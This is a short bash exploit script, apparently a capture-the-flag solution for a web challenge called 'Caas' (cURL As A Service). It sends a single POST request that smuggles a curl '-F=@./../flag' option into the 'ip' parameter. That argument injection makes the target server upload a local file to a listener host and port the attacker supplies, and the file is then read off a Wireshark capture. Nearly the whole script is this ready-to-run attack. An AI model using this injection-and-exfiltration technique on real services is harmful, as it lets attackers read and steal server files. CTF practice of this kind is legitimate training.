#!/bin/bash



# @elbee_ez

####################################################################################
####################################################################################
# Caas | Difficulty 2-stars | Web  #################################################
####################################################################################
# cURL As A Service or CAAS is a brand new Alien application, built so that humans #
# can test the status of their websites. However, it seems that the Aliens have not 
# quite got the hang of Human programming and the application is riddled with issues.
# This challenge will raise 43 euros for a good cause. #############################
####################################################################################
####################################################################################


if [ "$#" -ne 4 ]; then
	echo "Usuage: ./caas.sh <rhost> <rport> <lhost> <lport>"
	echo "(Start a server and serve on all interfaces)"
else
	echo "Exploit will start in 10 seconds, start a wireshark capture and use the following display filter:"
	echo "tcp.port == $4"
	sleep 10
	echo "Sending payload.."
	curl -X POST http://$1:$2/api/curl -d "ip=-F=@./../flag+http://$3:$4"
	echo ""
	echo "Check the wireshark capture for a packet from $1, flag should be in the packet's contents."
	echo ""
fi


